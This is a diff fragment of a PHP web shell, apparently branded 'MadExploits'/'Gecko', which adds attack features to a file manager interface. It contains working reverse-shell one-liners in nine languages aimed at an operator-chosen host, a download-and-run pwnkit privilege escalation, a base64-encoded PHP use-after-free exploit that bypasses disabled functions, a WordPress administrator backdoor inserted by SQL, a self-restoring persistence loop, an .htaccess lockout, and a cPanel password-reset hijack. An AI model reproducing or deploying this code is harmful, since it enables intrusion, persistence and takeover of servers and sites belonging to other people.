+                </div>
+                <div class="terminal-body">
+                    <textarea name="" disabled><?php if ($fungsi[3]('.mad-root') && $fungsi[3]('pwnkit')) {
+                                                    $response = $fungsi[11]('.mad-root');
+                                                    $r_text = explode(" ", $response);
+                                                    if ($r_text[0] == "uid=0(root)") {
+                                                        if (isset($_POST['submit-root'])) {
+                                                            echo cmd('./pwnkit "' . $_POST['root-terminal'] . '  2>&1"');
+                                                        }
+                                                    } else {
+                                                        echo "This Device Is Not Vulnerable\n";
+                                                        echo cmd('cat /etc/os-release') . "\n";
+                                                        echo "Kernel Version : " . suggest_exploit() . "\n";
+                                                    }
+                                                } else {
+                                                    $fungsi[24]('.mad-root');
+                                                } ?></textarea>
+                    <form action="" method="post">
+                        <ul>
+                            <li><input type="text" name="root-terminal" class="terminal-input" placeholder="<?= "root" . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus></li>
+                            <li><input type="submit" name="submit-root" value=">" class="btn-modal-close"></li>
+                        </ul>
+                    </form>
+                </div>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if ($_GET['re'] == true) : ?>
+        <div class="modal active">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <h3><b><i id="modal-title">Rename : <?= unx($_GET['re']) ?></i></b></h3>
+                </div>
+                <div class="modal-body">
+                    <form action="" method="post">
+                        <span id="modal-input"><input type="text" name="renameFile" class="modal-create-input" placeholder="Rename"></span>
+                        <div class="modal-btn-form">
+                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow close-btn-s">Close</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+        </div>
+    <?php endif; ?>
+    <?php if ($_GET['ch'] == true) : ?>
+        <div class="modal active">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <h3><b><i id="modal-title">Change Permission : <?= unx($_GET['ch']) ?></i></b></h3>
+                </div>
+                <div class="modal-body">
+                    <form action="" method="post">
+                        <span id="modal-input"><input type="number" name="chFile" class="modal-create-input" placeholder="0775"></span>
+                        <div class="modal-btn-form">
+                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow close-btn-s">Close</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+        </div>
+    <?php endif; ?>
+    <script>
+        $(document).ready(function() {
+
+
+            $('#create_folder').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-folder-plus"></i>&nbsp;Create Folder');
+                $('#modal-input').html('<input type="text" name="create_folder" class="modal-create-input" placeholder="Create Folder">');
+                event.preventDefault();
+            });
+            $('#create_file').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File');
+                $('#modal-input').html('<input type="text" name="create_file" class="modal-create-input" placeholder="Create File">');
+                event.preventDefault();
+            });
+            $('#lock-file').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-lock"></i>&nbsp;LOCK FILE');
+                $('#modal-input').html('<input type="text" name="lockfile" class="modal-create-input" placeholder="Your File Name">');
+                event.preventDefault();
+            });
+            $('#root-user').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-user-plus"></i>&nbsp;ADD USER');
+                $('#modal-input').html('<input type="text" name="add-username" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-password" class="modal-create-input" placeholder="Password">');
+                event.preventDefault();
+            });
+
+            $('#create-rdp').click(function() {
+                $('.modal').show();
+                $('#modal-title').html(':: CREATE RDP');
+                $('#modal-input').html('<input type="text" name="add-rdp" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-rdp-pass" class="modal-create-input" placeholder="Password">');
+                event.preventDefault();
+            });
+
+            $('#close-modal').click(function() {
+                $('.modal').hide();
+                event.preventDefault();
+            });
+            $('#close-editor').click(function() {
+                $('.code-editor').hide();
+                event.preventDefault();
+            });
+
+            $('.close-terminal').click(function() {
+                $('.terminal').hide();
+                event.preventDefault();
+            });
+            $('.close-btn-s').click(function() {
+                $('.modal').hide();
+                event.preventDefault();
+            });
+
+
+            var myTextarea = document.getElementById("code");
+
+            var editor = CodeMirror.fromTextArea(myTextarea, {
+                mode: "xml",
+                lineNumbers: true,
+                theme: "ayu-mirage",
+                extraKeys: {
+                    "Ctrl-Space": "autocomplete"
+                },
+                hintOptions: {
+                    completeSingle: false,
+                },
+            });
+
+        });
+    </script>
+</body>
+
+</html>
+<?php
+
+if (isset($_POST['submitwp'])) {
+    $db_name = $_POST['db_name'];
+    $db_user = $_POST['db_user'];
+    $db_pass = $_POST['db_pass'];
+    $db_host = $_POST['db_host'];
+    $wp_user = $_POST['wp_user'];
+    $wp_pass = password_hash($_POST['wp_pass'], PASSWORD_DEFAULT);
+
+    $conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
+
+    if ($conn->connect_error) {
+        failed();
+        die("Error Cug : " . $conn->connect_error);
+    }
+
+    $sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('$wp_user', '$wp_pass', 'MadExploits', '', '', NOW(), '', 0, 'MadExploits')";
+
+    $sqltakeuserid = "SELECT ID FROM wp_users WHERE user_login = '$wp_user'";
+
+    if ($conn->query($sql) === TRUE && $conn->query($sqltakeuserid)) {
+        $result = $conn->query($sqltakeuserid);
+
+        if ($result->num_rows > 0) {
+            $row = $result->fetch_assoc();
+            $user_id = $row["ID"];
+
+            $sqlusermeta = "INSERT INTO wp_usermeta (umeta_id, user_id, meta_key, meta_value) VALUES ('', $user_id, 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')";
+
+            if ($conn->query($sqlusermeta) === TRUE) {
+                Success();
+            } else {
+                echo "Error: " . $sqlusermeta . "\n" . $conn->error;
+            }
         } else {
-            echo "URL saat ini tidak didefinisikan.";
+            echo "User tidak ditemukan.\n";
+        }
+
+        Success();
+    } else {
+        echo "Error: " . $sql . "\n" . $conn->error;
+    }
+
+    $conn->close();
+}
+
+
+
+if (isset($_GET['unlockshell'])) {
+    if (cmd("killall -9 php") && cmd("pkill -9 php")) {
+        success();
+    } else {
+        failed();
+    }
+}
+
+if (isset($_POST['submit-bc'])) {
+    $HostServer = $_POST['backconnect-host'];
+    $PortServer = $_POST['backconnect-port'];
+    if ($_POST['gecko-bc'] == "perl") {
+        echo cmd('perl -e \'use Socket;$i="' . $HostServer . '";$p=' . $PortServer . ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");' . $fungsi[16] . '("/bin/sh -i");};\'');
+    } else if ($_POST['gecko-bc'] == "python") {
+        echo cmd('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' . $HostServer . '",' . $PortServer . '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
+    } else if ($_POST['gecko-bc'] == "ruby") {
+        echo cmd('ruby -rsocket -e\'f=TCPSocket.open("' . $HostServer . '",' . $PortServer . ').to_i;' . $fungsi[16] . ' sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'');
+    } else if ($_POST['gecko-bc'] == "bash") {
+        echo cmd('bash -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
+    } else if ($_POST['gecko-bc'] == "php") {
+        echo cmd('php -r \'$sock=fsockopen("' . $HostServer . '",' . $PortServer . ');' . $fungsi[16] . '("/bin/sh -i <&3 >&3 2>&3");\'');
+    } else if ($_POST['gecko-bc'] == "nc") {
+        echo cmd('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' . $HostServer . ' ' . $PortServer . ' >/tmp/f');
+    } else if ($_POST['gecko-bc'] == "sh") {
+        echo cmd('sh -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
+    } else if ($_POST['gecko-bc'] == "xterm") {
+        echo cmd('xterm -display ' . $HostServer . ':' . $PortServer);
+    } else if ($_POST['gecko-bc'] == "golang") {
+        echo cmd('echo \'package main;import"os/' . $fungsi[16] . '";import"net";func main(){c,_:=net.Dial("tcp","' . $HostServer . ':' . $PortServer . '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go');
+    }
+}
+
+
+if ($_GET['terminal'] == "bypasser") {
+    if (!$fungsi[3]('.term-bypass') && $fungsi[4]($fungsi[0]())) {
+        $connt = 'PD9waHAKZnVuY3Rpb24gcHduKCRjbWRkKSB7CiAgICBnbG9iYWwgJGFiYywgJGhlbHBlciwgJGJhY2t0cmFjZTsKCiAgICBjbGFzcyBWdWxuIHsKICAgICAgICBwdWJsaWMgJGE7CiAgICAgICAgcHVibGljIGZ1bmN0aW9uIF9fZGVzdHJ1Y3QoKSB7IAogICAgICAgICAgICBnbG9iYWwgJGJhY2t0cmFjZTsgCiAgICAgICAgICAgIHVuc2V0KCR0aGlzLT5hKTsKICAgICAgICAgICAgJGJhY2t0cmFjZSA9IChuZXcgRXhjZXB0aW9uKS0+Z2V0VHJhY2UoKTsgIyA7KQogICAgICAgICAgICBpZighaXNzZXQoJGJhY2t0cmFjZVsxXVsnYXJncyddKSkgeyAjIFBIUCA+PSA3LjQKICAgICAgICAgICAgICAgICRiYWNrdHJhY2UgPSBkZWJ1Z19iYWNrdHJhY2UoKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBjbGFzcyBIZWxwZXIgewogICAgICAgIHB1YmxpYyAkYSwgJGIsICRjLCAkZDsKICAgIH0KCiAgICBmdW5jdGlvbiBzdHIycHRyKCYkc3RyLCAkcCA9IDAsICRzID0gOCkgewogICAgICAgICRhZGRyZXNzID0gMDsKICAgICAgICBmb3IoJGogPSAkcy0xOyAkaiA+PSAwOyAkai0tKSB7CiAgICAgICAgICAgICRhZGRyZXNzIDw8PSA4OwogICAgICAgICAgICAkYWRkcmVzcyB8PSBvcmQoJHN0clskcCskal0pOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJGFkZHJlc3M7CiAgICB9CgogICAgZnVuY3Rpb24gcHRyMnN0cigkcHRyLCAkbSA9IDgpIHsKICAgICAgICAkb3V0ID0gIiI7CiAgICAgICAgZm9yICgkaT0wOyAkaSA8ICRtOyAkaSsrKSB7CiAgICAgICAgICAgICRvdXQgLj0gY2hyKCRwdHIgJiAweGZmKTsKICAgICAgICAgICAgJHB0ciA+Pj0gODsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRvdXQ7CiAgICB9CgogICAgZnVuY3Rpb24gd3JpdGUoJiRzdHIsICRwLCAkdiwgJG4gPSA4KSB7CiAgICAgICAgJGkgPSAwOwogICAgICAgIGZvcigkaSA9IDA7ICRpIDwgJG47ICRpKyspIHsKICAgICAgICAgICAgJHN0clskcCArICRpXSA9IGNocigkdiAmIDB4ZmYpOwogICAgICAgICAgICAkdiA+Pj0gODsKICAgICAgICB9CiAgICB9CgogICAgZnVuY3Rpb24gbGVhaygkYWRkciwgJHAgPSAwLCAkcyA9IDgpIHsKICAgICAgICBnbG9iYWwgJGFiYywgJGhlbHBlcjsKICAgICAgICB3cml0ZSgkYWJjLCAweDY4LCAkYWRkciArICRwIC0gMHgxMCk7CiAgICAgICAgJGxlYWsgPSBzdHJsZW4oJGhlbHBlci0+YSk7CiAgICAgICAgaWYoJHMgIT0gOCkgeyAkbGVhayAlPSAyIDw8ICgkcyAqIDgpIC0gMTsgfQogICAgICAgIHJldHVybiAkbGVhazsKICAgIH0KCiAgICBmdW5jdGlvbiBwYXJzZV9lbGYoJGJhc2UpIHsKICAgICAgICAkZV90eXBlID0gbGVhaygkYmFzZSwgMHgxMCwgMik7CgogICAgICAgICRlX3Bob2ZmID0gbGVhaygkYmFzZSwgMHgyMCk7CiAgICAgICAgJGVfcGhlbnRzaXplID0gbGVhaygkYmFzZSwgMHgzNiwgMik7CiAgICAgICAgJGVfcGhudW0gPSBsZWFrKCRiYXNlLCAweDM4LCAyKTsKCiAgICAgICAgZm9yKCRpID0gMDsgJGkgPCAkZV9waG51bTsgJGkrKykgewogICAgICAgICAgICAkaGVhZGVyID0gJGJhc2UgKyAkZV9waG9mZiArICRpICogJGVfcGhlbnRzaXplOwogICAgICAgICAgICAkcF90eXBlICA9IGxlYWsoJGhlYWRlciwgMCwgNCk7CiAgICAgICAgICAgICRwX2ZsYWdzID0gbGVhaygkaGVhZGVyLCA0LCA0KTsKICAgICAgICAgICAgJHBfdmFkZHIgPSBsZWFrKCRoZWFkZXIsIDB4MTApOwogICAgICAgICAgICAkcF9tZW1zeiA9IGxlYWsoJGhlYWRlciwgMHgyOCk7CgogICAgICAgICAgICBpZigkcF90eXBlID09IDEgJiYgJHBfZmxhZ3MgPT0gNikgeyAjIFBUX0xPQUQsIFBGX1JlYWRfV3JpdGUKICAgICAgICAgICAgICAgICMgaGFuZGxlIHBpZQogICAgICAgICAgICAgICAgJGRhdGFfYWRkciA9ICRlX3R5cGUgPT0gMiA/ICRwX3ZhZGRyIDogJGJhc2UgKyAkcF92YWRkcjsKICAgICAgICAgICAgICAgICRkYXRhX3NpemUgPSAkcF9tZW1zejsKICAgICAgICAgICAgfSBlbHNlIGlmKCRwX3R5cGUgPT0gMSAmJiAkcF9mbGFncyA9PSA1KSB7ICMgUFRfTE9BRCwgUEZfUmVhZF9leGVjCiAgICAgICAgICAgICAgICAkdGV4dF9zaXplID0gJHBfbWVtc3o7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGlmKCEkZGF0YV9hZGRyIHx8ICEkdGV4dF9zaXplIHx8ICEkZGF0YV9zaXplKQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CgogICAgICAgIHJldHVybiBbJGRhdGFfYWRkciwgJHRleHRfc2l6ZSwgJGRhdGFfc2l6ZV07CiAgICB9CgogICAgZnVuY3Rpb24gZ2V0X2Jhc2ljX2Z1bmNzKCRiYXNlLCAkZWxmKSB7CiAgICAgICAgbGlzdCgkZGF0YV9hZGRyLCAkdGV4dF9zaXplLCAkZGF0YV9zaXplKSA9ICRlbGY7CiAgICAgICAgZm9yKCRpID0gMDsgJGkgPCAkZGF0YV9zaXplIC8gODsgJGkrKykgewogICAgICAgICAgICAkbGVhayA9IGxlYWsoJGRhdGFfYWRkciwgJGkgKiA4KTsKICAgICAgICAgICAgaWYoJGxlYWsgLSAkYmFzZSA+IDAgJiYgJGxlYWsgLSAkYmFzZSA8ICRkYXRhX2FkZHIgLSAkYmFzZSkgewogICAgICAgICAgICAgICAgJGRlcmVmID0gbGVhaygkbGVhayk7CiAgICAgICAgICAgICAgICAjICdjb25zdGFudCcgY29uc3RhbnQgY2hlY2sKICAgICAgICAgICAgICAgIGlmKCRkZXJlZiAhPSAweDc0NmU2MTc0NzM2ZTZmNjMpCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0gZWxzZSBjb250aW51ZTsKCiAgICAgICAgICAgICRsZWFrID0gbGVhaygkZGF0YV9hZGRyLCAoJGkgKyA0KSAqIDgpOwogICAgICAgICAgICBpZigkbGVhayAtICRiYXNlID4gMCAmJiAkbGVhayAtICRiYXNlIDwgJGRhdGFfYWRkciAtICRiYXNlKSB7CiAgICAgICAgICAgICAgICAkZGVyZWYgPSBsZWFrKCRsZWFrKTsKICAgICAgICAgICAgICAgICMgJ2JpbjJoZXgnIGNvbnN0YW50IGNoZWNrCiAgICAgICAgICAgICAgICBpZigkZGVyZWYgIT0gMHg3ODY1NjgzMjZlNjk2MikKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfSBlbHNlIGNvbnRpbnVlOwoKICAgICAgICAgICAgcmV0dXJuICRkYXRhX2FkZHIgKyAkaSAqIDg7CiAgICAgICAgfQogICAgfQoKICAgIGZ1bmN0aW9uIGdldF9iaW5hcnlfYmFzZSgkYmluYXJ5X2xlYWspIHsKICAgICAgICAkYmFzZSA9IDA7CiAgICAgICAgJHN0YXJ0ID0gJGJpbmFyeV9sZWFrICYgMHhmZmZmZmZmZmZmZmZmMDAwOwogICAgICAgIGZvcigkaSA9IDA7ICRpIDwgMHgxMDAwOyAkaSsrKSB7CiAgICAgICAgICAgICRhZGRyID0gJHN0YXJ0IC0gMHgxMDAwICogJGk7CiAgICAgICAgICAgICRsZWFrID0gbGVhaygkYWRkciwgMCwgNyk7CiAgICAgICAgICAgIGlmKCRsZWFrID09IDB4MTAxMDI0NjRjNDU3ZikgeyAjIEVMRiBoZWFkZXIKICAgICAgICAgICAgICAgIHJldHVybiAkYWRkcjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBmdW5jdGlvbiBnZXRfc3lzdGVtKCRiYXNpY19mdW5jcykgewogICAgICAgICRhZGRyID0gJGJhc2ljX2Z1bmNzOwogICAgICAgIGRvIHsKICAgICAgICAgICAgJGZfZW50cnkgPSBsZWFrKCRhZGRyKTsKICAgICAgICAgICAgJGZfbmFtZSA9IGxlYWsoJGZfZW50cnksIDAsIDYpOwoKICAgICAgICAgICAgaWYoJGZfbmFtZSA9PSAweDZkNjU3NDczNzk3MykgeyAjIHN5c3RlbQogICAgICAgICAgICAgICAgcmV0dXJuIGxlYWsoJGFkZHIgKyA4KTsKICAgICAgICAgICAgfQogICAgICAgICAgICAkYWRkciArPSAweDIwOwogICAgICAgIH0gd2hpbGUoJGZfZW50cnkgIT0gMCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIGZ1bmN0aW9uIHRyaWdnZXJfdWFmKCRhcmcpIHsKICAgICAgICAjIHN0cl9zaHVmZmxlIHByZXZlbnRzIG9wY2FjaGUgc3RyaW5nIGludGVybmluZwogICAgICAgICRhcmcgPSBzdHJfc2h1ZmZsZShzdHJfcmVwZWF0KCdBJywgNzkpKTsKICAgICAgICAkdnVsbiA9IG5ldyBWdWxuKCk7CiAgICAgICAgJHZ1bG4tPmEgPSAkYXJnOwogICAgfQoKICAgIGlmKHN0cmlzdHIoUEhQX09TLCAnV0lOJykpIHsKICAgICAgICBkaWUoJ1RoaXMgUG9DIGlzIGZvciAqbml4IHN5c3RlbXMgb25seS4nKTsKICAgIH0KCiAgICAkbl9hbGxvYyA9IDEwOyAjIGluY3JlYXNlIHRoaXMgdmFsdWUgaWYgVUFGIGZhaWxzCiAgICAkY29udGlndW91cyA9IFtdOwogICAgZm9yKCRpID0gMDsgJGkgPCAkbl9hbGxvYzsgJGkrKykKICAgICAgICAkY29udGlndW91c1tdID0gc3RyX3NodWZmbGUoc3RyX3JlcGVhdCgnQScsIDc5KSk7CgogICAgdHJpZ2dlcl91YWYoJ3gnKTsKICAgICRhYmMgPSAkYmFja3RyYWNlWzFdWydhcmdzJ11bMF07CgogICAgJGhlbHBlciA9IG5ldyBIZWxwZXI7CiAgICAkaGVscGVyLT5iID0gZnVuY3Rpb24gKCR4KSB7IH07CgogICAgaWYoc3RybGVuKCRhYmMpID09IDc5IHx8IHN0cmxlbigkYWJjKSA9PSAwKSB7CiAgICAgICAgZGllKCJVQUYgZmFpbGVkIik7CiAgICB9CgogICAgIyBsZWFrcwogICAgJGNsb3N1cmVfaGFuZGxlcnMgPSBzdHIycHRyKCRhYmMsIDApOwogICAgJHBocF9oZWFwID0gc3RyMnB0cigkYWJjLCAweDU4KTsKICAgICRhYmNfYWRkciA9ICRwaHBfaGVhcCAtIDB4Yzg7CgogICAgIyBmYWtlIHZhbHVlCiAgICB3cml0ZSgkYWJjLCAweDYwLCAyKTsKICAgIHdyaXRlKCRhYmMsIDB4NzAsIDYpOwoKICAgICMgZmFrZSByZWZlcmVuY2UKICAgIHdyaXRlKCRhYmMsIDB4MTAsICRhYmNfYWRkciArIDB4NjApOwogICAgd3JpdGUoJGFiYywgMHgxOCwgMHhhKTsKCiAgICAkY2xvc3VyZV9vYmogPSBzdHIycHRyKCRhYmMsIDB4MjApOwoKICAgICRiaW5hcnlfbGVhayA9IGxlYWsoJGNsb3N1cmVfaGFuZGxlcnMsIDgpOwogICAgaWYoISgkYmFzZSA9IGdldF9iaW5hcnlfYmFzZSgkYmluYXJ5X2xlYWspKSkgewogICAgICAgIGRpZSgiQ291bGRuJ3QgZGV0ZXJtaW5lIGJpbmFyeSBiYXNlIGFkZHJlc3MiKTsKICAgIH0KCiAgICBpZighKCRlbGYgPSBwYXJzZV9lbGYoJGJhc2UpKSkgewogICAgICAgIGRpZSgiQ291bGRuJ3QgcGFyc2UgRUxGIGhlYWRlciIpOwogICAgfQoKICAgIGlmKCEoJGJhc2ljX2Z1bmNzID0gZ2V0X2Jhc2ljX2Z1bmNzKCRiYXNlLCAkZWxmKSkpIHsKICAgICAgICBkaWUoIkNvdWxkbid0IGdldCBiYXNpY19mdW5jdGlvbnMgYWRkcmVzcyIpOwogICAgfQoKICAgIGlmKCEoJHppZl9zeXN0ZW0gPSBnZXRfc3lzdGVtKCRiYXNpY19mdW5jcykpKSB7CiAgICAgICAgZGllKCJDb3VsZG4ndCBnZXQgemlmX3N5c3RlbSBhZGRyZXNzIik7CiAgICB9CgogICAgIyBmYWtlIGNsb3N1cmUgb2JqZWN0CiAgICAkZmFrZV9vYmpfb2Zmc2V0ID0gMHhkMDsKICAgIGZvcigkaSA9IDA7ICRpIDwgMHgxMTA7ICRpICs9IDgpIHsKICAgICAgICB3cml0ZSgkYWJjLCAkZmFrZV9vYmpfb2Zmc2V0ICsgJGksIGxlYWsoJGNsb3N1cmVfb2JqLCAkaSkpOwogICAgfQoKICAgICMgcHduCiAgICB3cml0ZSgkYWJjLCAweDIwLCAkYWJjX2FkZHIgKyAkZmFrZV9vYmpfb2Zmc2V0KTsKICAgIHdyaXRlKCRhYmMsIDB4ZDAgKyAweDM4LCAxLCA0KTsgIyBpbnRlcm5hbCBmdW5jIHR5cGUKICAgIHdyaXRlKCRhYmMsIDB4ZDAgKyAweDY4LCAkemlmX3N5c3RlbSk7ICMgaW50ZXJuYWwgZnVuYyBoYW5kbGVyCgogICAgKCRoZWxwZXItPmIpKCRjbWRkKTsKfQ==';
+        $fungsi[28](".term-bypass", $fungsi[32]($connt));
+    }
+}
+
+
+if (isset($_GET['lockshell'])) {
+    $curFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
+    $TmpNames = $fungsi[31]();
+    if (file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler')) && file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'))) {
+        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'));
+        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-handler'));
+    }
+    mkdir($TmpNames . "/.sessions");
+    cmd("cp $curFile " . $TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'));
+    chmod($curFile, 0444);
+    $handler = '
+<?php
+@ini_set("max_execution_time", 0);
+while (True){
+    if (!file_exists("' . __DIR__ . '")){
+        mkdir("' . __DIR__ . '");
+    }
+    if (!file_exists("' . $fungsi[0]() . '/' . $curFile . '")){
+        $text = ' . $fungsi[33] . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text') . '"));
+        file_put_contents("' . $fungsi[0]() . '/' . $curFile . '", ' . $fungsi[32] . '($text));
+    }
+    if (gecko_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
+        chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
+    }
+    if (gecko_perm("' . __DIR__ . '") != 0555){
+        chmod("' . __DIR__ . '", 0555);
+    }
+}
+
+function gecko_perm($flename){
+    return substr(sprintf("%o", fileperms($flename)), -4);
+}
+';
+    $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler') . "", $handler);
+    if ($hndlers) {
+        cmd(PHP_BINARY . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler') . ' > /dev/null 2>/dev/null &');
+        success();
+    } else {
+        failed();
+    }
+}
+if (isset($_POST['gecko-up-submit'])) {
+    $namaFilenya = $_FILES['gecko-upload']['name'];
+    $tmpName = $_FILES['gecko-upload']['tmp_name'];
+    if ($fungsi[29]($tmpName, $fungsi[0]() . "/" . $namaFilenya)) {
+        success();
+    } else {
+        failed();
+    }
+}
+
+if (isset($_GET['destroy'])) {
+    $DOC_ROOT = $_SERVER["\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54"];
+    $CurrentFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
+    if ($fungsi[4]($DOC_ROOT)) {
+        $htaccess = '
+<FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$">
+    Deny from all
+</FilesMatch>
+<FilesMatch "^(' . $CurrentFile . '|index.php|wp-config.php|wp-includes.php)$">
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
+    Allow from all
+</FilesMatch>';
+        $put_htt = $fungsi[28]($DOC_ROOT . "/.htaccess", $htaccess);
+        if ($put_htt) {
+            success();
+        } else {
+            failed();
         }
     } else {
-        homepage();
-        exit();
+        failed();
     }
-} else {
-    homepage();
-    exit();
 }
 
+
+if (isset($_POST['save-editor'])) {
+    $save = $fungsi[28]($fungsi[0]() . "/" . unx($_GET['f']), $_POST['code-editor']);
+    if ($save) {
+        success();
+    } else {
+        failed();
+    }
+}
+
+if (isset($_GET['adminer'])) {
+    $URL = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x76\x72\x61\x6e\x61\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2f\x72\x65\x6c\x65\x61\x73\x65\x73\x2f\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x2f\x76\x34\x2e\x38\x2e\x31\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2d\x34\x2e\x38\x2e\x31\x2e\x70\x68\x70";
+    if (!$fungsi[3]('adminer.php')) {
+        $fungsi[28]("adminer.php", $fungsi[11]($URL));
+        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '">';
+    }
+}
+
+
+if ($_GET['terminal'] == "root") {
+    if (!$fungsi[3]('pwnkit') && $fungsi[4]($fungsi[0]())) {
+        $fungsi[28]("pwnkit", $fungsi[11]("https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit"));
+        cmd('chmod +x pwnkit');
+        echo cmd('./pwnkit "id" > .mad-root');
+        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&terminal=root">';
+    }
+}
+
+if (isset($_POST['submit-action'])) {
+    $items = $_POST['check'];
+    if ($_POST['gecko-select'] == "delete") {
+        foreach ($items as $it) {
+            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
+            $fd = $repl . "/" . $it;
+            if (is_dir($fd) || is_file($fd)) {
+                $rmdir = unlinkDir($fd);
+                $rmfile = $fungsi[24]($fd);
+                if ($rmdir || $rmfile) {
+                    success();
+                } else if ($rmdir && $rmfile) {
+                    success();
+                } else {
+                    failed();
+                }
+            }
+        }
+    } else if ($_POST['gecko-select'] == 'unzip') {
+        foreach ($items as $it) {
+            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
+            $fd = $repl . "/" . $it;
+            if (ExtractArchive($fd, $repl . '/') == true) {
+                success();
+            } else {
+                failed();
+            }
+        }
+    } else if ($_POST['gecko-select'] == 'zip') {
+        foreach ($items as $it) {
+            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
+            $fd = $repl . "/" . $it;
+            if ($fungsi[3]($fd)) {
+                compressToZip($fd, pathinfo($fd, PATHINFO_FILENAME) . ".zip");
+            }
+        }
+    }
+}
+
+if (isset($_POST['submit'])) {
+    if ($_POST['resetcp'] == true) {
+        $emailCp = $_POST['resetcp'];
+        $path0cp = dirname($_SERVER['DOCUMENT_ROOT']);
+        $pathcp = $path0cp . "/.cpanel/contactinfo";
+        $contactinfo = '
+"email" : "' . $emailCp . '"
+        ';
+        if ($fungsi[3]($pathcp)) {
+            $fungsi[28]($pathcp, $contactinfo);
+            echo '<meta http-equiv="refresh" content="0;url=' . $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['SERVER_NAME'] . ':2083/resetpass?start=1">';
+        } else {
+            failed();
+        }
+    }
+    if ($_POST['create_folder'] == true) {
+        $NamaFolder = $fungsi[12]($_POST['create_folder']);
+        if ($NamaFolder) {
+            success();
+        } else {
+            failed();
+        }
+    } else if ($_POST['create_file'] == true) {
+        $namaFile = $fungsi[13]($_POST['create_file']);
+        if ($namaFile) {
+            success();
+        } else {
+            failed();
+        }
+    } else if ($_POST['renameFile'] == true) {
+        $renameFile = $fungsi[15](unx($_GET['re']), $_POST['renameFile']);
+        if ($renameFile) {
+            success();
+        } else {
+            failed();
+        }
+    } else if ($_POST['chFile']) {
